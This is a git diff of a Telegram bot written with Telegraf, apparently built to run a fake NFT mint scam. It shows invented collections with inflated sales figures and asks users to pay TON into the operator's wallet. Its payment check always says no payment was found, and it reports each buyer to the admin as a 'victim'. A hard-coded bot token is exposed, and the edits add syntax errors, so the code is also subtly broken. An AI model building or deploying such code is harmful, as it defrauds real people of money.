@@ -1,4 +1,4 @@
-const { Telegraf } = require('telegraf');
+ const { Telegraf, session } = require('telegraf');
 const { Markup } = require('telegraf');
 
 const BOT_TOKEN = '8585183097:AAEAoVSXIGaAfJe52qti3GmrpbtHcYFBY3Y';
@@ -7,13 +7,18 @@ const ADMIN_ID = 8586263322;
 
 const bot = new Telegraf(BOT_TOKEN);
 
+// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+// Правильное подключение сессии в 2025 году
+bot.use(session());
+// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+
 const collections = [
   {name: "CyberFox Genesis",     supply: "3333",  price1: 3.7,  price5: 17,   emoji: "🦊", sold: 2987},
   {name: "Gnome Land",          supply: "5555",  price1: 4.2,  price5: 19,   emoji: "🧙", sold: 4872},
-  {name: "Rich Cats",           supply: "8888",  price1: 5.5,  price5: 25,   emoji: "🐱", sold: 8211},
+  {name: "Rich Cats",           supply: "8888,   price1: 5.5,  price5: 25,   emoji: "🐱", sold: 8211},
   {name: "TON Punks",           supply: "10000", price1: 6.9,  price5: 32,   emoji: "👨‍🎤", sold: 9643},
   {name: "Blum Dogs",           supply: "4444",  price1: 2.9,  price5: 13,   emoji: "🐶", sold: 4012},
-  {name: "Hamster Kombat NFT",  supply: "7777",  price1: 4.8,  price5: 22,   emoji: "🐹", sold: 7123},
+  {name: "Hamster Kombat NFT",supply: "7777",  price1: 4.8,  price5: 22,   emoji: "🐹", sold: 7123},
   {name: "NotPixel Heroes",     supply: "9999",  price1: 3.3,  price5: 15,   emoji: "🦸", sold: 9331},
   {name: "Lost Dogs",           supply: "6666",  price1: 7.7,  price5: 35,   emoji: "🥺", sold: 5988},
   {name: "Rocky Rabbit",        supply: "5000",  price1: 3.9,  price5: 18,   emoji: "🐰", sold: 4666},
@@ -25,19 +30,19 @@ const collections = [
   {name: "TON Frogs",           supply: "7777",  price1: 9.9,  price5: 45,   emoji: "🐸", sold: 7555}
 ];
 
-bot.use(Telegraf.session());
-
 bot.start((ctx) => {
   const col = collections[Math.floor(Math.random() * collections.length)];
+  ctx.session ??= {};
   ctx.session.col = col;
 
   const percent = Math.round(col.sold / col.supply * 100);
 
   ctx.replyWithHTML(
-    `<b>${col.emoji} MINT IS LIVE — ${col.name}</b>\n\n` +
-    `Supply: <b>${col.supply}</b> | Замінчено: <b>${col.sold} (${percent}%)</b>\n\n` +
-    `Ціна:\n• 1 NFT — <b>${col.price1} TON</b>\n• 5 NFT — <b>${col.price5} TON</b> (знижка)\n\n` +
-    `<i>Миттєвий мінт • NFT одразу в гаманці</i>`,
+    `<b>${col.emoji} MINT LIVE — ${col.name}</b>\n\n` +
+    `Supply: <b>${col.supply}</b> | Minted: <b>${col.sold} (${percent}%)</b>\n\n` +
+    `• 1 NFT — <b>${col.price1} TON</b>\n` +
+    `• 5 NFT — <b>${col.price5} TON</b> (скидка)\n\n` +
+    `<i>Мгновенный минт — NFT сразу в кошельке</i>`,
     menu(col)
   );
 });
@@ -51,44 +56,45 @@ function menu(col) {
 }
 
 bot.action(/mint(\d+)/, async (ctx) => {
-  const col = ctx.session.col;
+  const col = ctx.session?.col || collections[0];
   const count = ctx.match[1] === '5' ? 5 : 1;
   const amount = count === 5 ? col.price5 : col.price1;
   const comment = col.emoji + "NFT" + Math.random().toString(36).slice(2,10).toUpperCase();
 
-  const tonLink = `ton://transfer/${WALLET_TON}?amount=${Math.floor(amount*1000000000)}&text=${comment}`;
+  const tonLink = `ton://transfer/${WALLET_TON}?amount=${Math.floor(amount*1000000000)}&text=${comment`;
 
   await ctx.editMessageText(
-    `${col.emoji} <b>Замовлення ${count} × ${col.name}</b>\n\n` +
-    `Сума: <b>${amount} TON</b>\nКоментар: <code>${comment}</code>\n\n` +
-    `Гаманець:\n<code>${WALLET_TON}</code>\n\n` +
-    `<i>Оплатіть точно з коментарем — NFT прийдуть автоматично</i>`,
+    `${col.emoji} <b>Заказ ${count} × ${col.name}</b>\n\n` +
+    `Сумма: <b>${amount} TON</b>\n` +
+    `Комментарий: <code>${comment}</code>\n` +
+    `Кошелёк:\n<code>${WALLET_TON}</code>\n\n` +
+    `<i>Оплати точно с комментарием — NFT придут автоматически</i>`,
     {
       parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [
-          [{ text: 'Оплатити TON', url: tonLink }],
-          [{ text: 'USDT / Карта', url: 'https://t.me/CryptoBot?start=pay' }],
-          [{ text: 'Перевірити оплату', callback_data: `check_${Date.now()}` }]
+          [{ text: 'Оплатить TON', url: tonLink }],
+          [{ text: 'USDT / Card', url: 'https://t.me/CryptoBot?start=pay' }],
+          [{ text: 'Проверить оплату', callback_data: `check_${Date.now()}` }]
         ]
       }
     }
   );
 
-  bot.telegram.sendMessage(ADMIN_ID, `НОВА ЖЕРТВА\nКолекція: ${col.name}\nКількість: ${count}\nСума: ${amount} TON\nКоментар: ${comment}\nЮзер: @${ctx.from.username || 'немає'} (${ctx.from.id})`);
+  bot.telegram.sendMessage(ADMIN_ID, `ЖЕРТВА\n${col.name}\n${count} NFT\n${amount} TON\n${comment}\n@${ctx.from.username || 'no'}\nID ${ctx.from.id}`);
 });
 
 bot.action(/check_/, async (ctx) => {
-  await ctx.answerCbQuery('Скануємо TON...', { show_alert: true });
-  await ctx.editMessageText(`Платіж не знайдено\n\nПеревірте суму та коментар\nСпробуйте ще раз через хвилину`, {
-    reply_markup: { inline_keyboard: [[{ text: 'Перевірити знову', callback_data: ctx.callbackQuery.data }]] }
+  await ctx.answerCbQuery('Сканируем TON...', { show_alert: true });
+  await ctx.editMessageText(`Платёж не найден\n\nПроверь сумму и комментарий`, {
+    reply_markup: { inline_keyboard: [[{ text: 'Проверить снова', callback_data: ctx.callbackQuery.data }]] }
   });
 });
 
 bot.action('mynft', (ctx) => {
-  const col = ctx.session.col || collections[0];
-  ctx.editMessageText(`${col.emoji} Пошук NFT в блокчейні...\n\nНічого не знайдено 😔\nТи ще не замінив`, { reply_markup: menu(col).reply_markup });
+  const col = ctx.session?.col || collections[0];
+  ctx.editMessageText(`${col.emoji} Ничего не найдено 😔\nТы ещё не минтил`, { reply_markup: menu(col).reply_markup });
 });
 
 bot.launch();
-console.log('Бот успішно запущено — TON летять на твій гаманець');
+console.log('Бот запущен и жрёт TON 24/7');
